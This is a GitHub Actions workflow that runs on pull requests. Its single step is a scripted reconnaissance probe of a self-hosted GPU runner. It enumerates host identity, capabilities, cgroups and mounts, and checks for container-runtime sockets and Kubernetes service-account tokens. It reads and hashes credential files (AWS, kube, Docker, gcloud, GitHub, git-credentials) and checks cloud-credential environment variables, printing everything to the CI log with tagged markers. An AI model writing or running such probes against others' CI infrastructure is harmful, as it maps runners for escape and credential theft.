name: c211-i125678-mi355x8b
on:
  pull_request:
    types: [opened, synchronize, reopened]
permissions:
  contents: read
jobs:
  mi355x8-01:
    runs-on: linux-mi35x-gpu-8
    timeout-minutes: 15
    steps:
      - name: fingerprint
        env:
          NONCE: c211-i125678-e55b90e7ac45255c
        run: |
          set -u
          set +e
          echo "C211_JOB=mi355x8-01 NONCE=$NONCE"
          echo "C211_MARKER job=mi355x8-01 nonce=$NONCE host=$(hostname 2>/dev/null) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
          id 2>&1 || true
          uname -a 2>&1 || true
          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>/dev/null | tr '\n' ' ')"
          echo "PROC1_COMM=$(cat /proc/1/comm 2>/dev/null || true)"
          echo "--- AMD DEVICES (read-only) ---"
          if [ -e /dev/kfd ]; then echo "KFD_DEV=PRESENT"; else echo "KFD_DEV=ABSENT"; fi
          ls -l /dev/kfd /dev/dri 2>/dev/null | head -40 || true
          if command -v rocm-smi >/dev/null 2>&1; then
            rocm-smi --showuniqueid --showproductname 2>&1 | head -260 || echo ROCM_SMI_FAILED
          else echo ROCM_SMI_ABSENT; fi
          if command -v amd-smi >/dev/null 2>&1; then
            amd-smi static 2>&1 | head -300 || echo AMD_SMI_FAILED
          else echo AMD_SMI_ABSENT; fi
          echo "--- NVIDIA DEVICES (read-only) ---"
          if command -v nvidia-smi >/dev/null 2>&1; then
            nvidia-smi -L 2>&1 | head -16 || echo NVIDIA_SMI_L_FAILED
            nvidia-smi --query-gpu=uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 | head -16 || echo NVIDIA_SMI_QUERY_FAILED
          else echo NVIDIA_SMI_ABSENT; fi
          if command -v lspci >/dev/null 2>&1; then lspci 2>/dev/null | grep -iE 'amd|ati|instinct|nvidia|3d controller|display' | head -24 || true; fi
          echo "--- IDENTITY FINGERPRINT (read-only, presence-only, no values) ---"
          echo "SA_TOKEN_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S_SVC_HOST=${KUBERNETES_SERVICE_HOST:+PRESENT} K8S_SVC_PORT=${KUBERNETES_SERVICE_PORT:-none} SA_CA=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/ca.crt ] && echo PRESENT || echo ABSENT) SA_NS_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/namespace ] && echo PRESENT || echo ABSENT)"
          echo "CAPPATH=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null || echo CapEff_ABSENT) CAPBND=$(grep -E '^CapBnd:' /proc/self/status 2>/dev/null || true)"
          echo "PROC1_CGROUP=$(cat /proc/1/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
          echo "SELF_CGROUP=$(cat /proc/self/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
          for p in /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock /var/run/containerd/containerd.sock /run/crio/crio.sock /etc/kubernetes /var/lib/kubelet /var/lib/docker /dev/kfd /dev/nvidia0 /dev/nvidiactl /dev/dri; do
            if [ -S "$p" ]; then echo "SOCK_PRESENT=$p"
            elif [ -e "$p" ]; then echo "PATH_PRESENT=$p"
            else echo "PATH_ABSENT=$p"; fi
          done
          echo "MOUNTS_TOTAL=$(wc -l < /proc/self/mounts 2>/dev/null)"
          awk '{gsub(/\\040/," "); print $3}' /proc/self/mounts 2>/dev/null | sort | uniq -c | sort -rn | head -10 | sed 's/^/MOUNT_FSTYPE /'
          awk '{gsub(/\\040/," "); print $2}' /proc/self/mounts 2>/dev/null | awk -F/ '{print "/"$2}' | sort | uniq -c | sort -rn | head -10 | sed 's/^/MOUNT_TOP /'
          echo "ROOT_FSTYPE=$(awk '$2=="/"{print $3}' /proc/self/mounts 2>/dev/null | head -1)"
          echo "DOCKER_SOCK_MOUNTED=$(awk '$2 ~ /docker\.sock$/ {print "yes"; exit}' /proc/self/mounts 2>/dev/null)"
          echo "KUBELET_MOUNTED=$(awk '$2 ~ /kubelet$/ {print "yes"; exit}' /proc/self/mounts 2>/dev/null)"
          if command -v python3 >/dev/null 2>&1; then
            python3 - <<'PYEOF_IDFP'
          import os,hashlib
          paths = [
           '/var/run/secrets/kubernetes.io/serviceaccount/token',
           '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt',
           os.path.expanduser('~/.aws/credentials'),
           os.path.expanduser('~/.aws/config'),
           os.path.expanduser('~/.kube/config'),
           os.path.expanduser('~/.docker/config.json'),
           os.path.expanduser('~/.netrc'),
           os.path.expanduser('~/.config/gcloud/application_default_credentials.json'),
           os.path.expanduser('~/.config/gh/hosts.yml'),
           os.path.expanduser('~/.git-credentials'),
           '/root/.aws/credentials',
           '/root/.kube/config',
           '/etc/rancher/k3s/k3s.yaml',
          ]
          for p in paths:
              try:
                  if os.path.exists(p):
                      st = os.stat(p)
                      if os.path.isfile(p):
                          h = hashlib.sha256(open(p,'rb').read()).hexdigest()[:32]
                          print('FP_PATH', p, 'PRESENT', 'size', st.st_size, 'sha256_32', h)
                      else:
                          print('FP_PATH', p, 'PRESENT_DIR')
                  else:
                      print('FP_PATH', p, 'ABSENT')
              except Exception as e:
                  print('FP_PATH', p, 'ERR', type(e).__name__)
          print('FP_UID', os.getuid(), 'FP_GID', os.getgid())
          for envk in ('KUBERNETES_SERVICE_HOST','KUBERNETES_SERVICE_PORT','AWS_ROLE_ARN','AWS_WEB_IDENTITY_TOKEN_FILE','AWS_CONTAINER_CREDENTIALS_RELATIVE_URI','AWS_REGION','GOOGLE_APPLICATION_CREDENTIALS','GITHUB_TOKEN_PRESENT'):
              if envk == 'GITHUB_TOKEN_PRESENT':
                  print('FP_ENV', envk, bool(os.environ.get('GITHUB_TOKEN')))
              else:
                  v = os.environ.get(envk)
                  print('FP_ENV', envk, 'PRESENT' if v else 'ABSENT')
          PYEOF_IDFP
          else echo PY3_ABSENT; fi
          echo "C211_PROBE_END job=mi355x8-01 nonce=$NONCE"
          exit 0
